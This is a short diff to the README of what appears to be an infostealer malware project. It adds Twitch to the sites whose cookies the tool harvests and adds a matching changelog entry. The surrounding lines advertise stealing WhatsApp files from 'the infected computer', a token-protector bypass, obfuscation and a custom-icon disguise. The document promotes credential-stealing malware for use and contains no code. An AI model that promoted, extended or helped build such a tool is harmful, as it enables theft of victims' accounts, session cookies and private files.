@@ -36,7 +36,7 @@
 
 🖼️ - Custom icon (Put custom icon (.ico format))
 
-🤖 - Website Cookie Information (Spotify, Roblox, Tiktok, Guilded, Patreon)
+🤖 - Website Cookie Information (Spotify, Roblox, Tiktok, Guilded, Patreon, Twitch)
 
 🤔 - Whatsapp Stealer: Steal all whatsapp file on the infected computer
 
@@ -83,6 +83,7 @@
 
 ## <a id="Changelog"></a>📝・Changelog
 ```
+- V4.6.6 Added Cookie Twitch Support !
 - V4.6.5 Added Better Discord and Token Protector Bypass
 - V4.6.2 Fixed Crypto error
 - V4.6 Better Looking Obfuscation and added Custom Icon
